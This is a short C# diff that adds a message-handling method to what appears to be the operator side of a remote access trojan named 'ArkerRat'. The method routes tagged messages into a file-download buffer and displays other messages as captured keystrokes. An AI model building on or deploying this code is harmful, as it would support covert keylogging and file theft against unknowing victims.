@@ -86,6 +86,32 @@ namespace ArkerRatWpfVersion
             }
         }
 
+        public void HandleData(string subString)
+        {
+            if (subString.Contains("§OFK§"))
+            {
+                subString = subString.Replace("§OFK§", string.Empty);
+
+                if (subString == "start")
+                {
+                    Task.Run(() => StartDownloadingFile());
+                }
+                else if (subString == "end")
+                {
+                    download = false;
+                    dataBuffer = new ConcurrentQueue<string>();
+                }
+                else
+                {
+                    AddDataToBuffer(subString);
+                }
+            }
+            else
+            {
+                WriteKeyInputToTextBox(subString);
+            }
+        }
+
         public void WriteKeyInputToTextBox(string key)
         {
             Application.Current.Dispatcher.Invoke(() =>
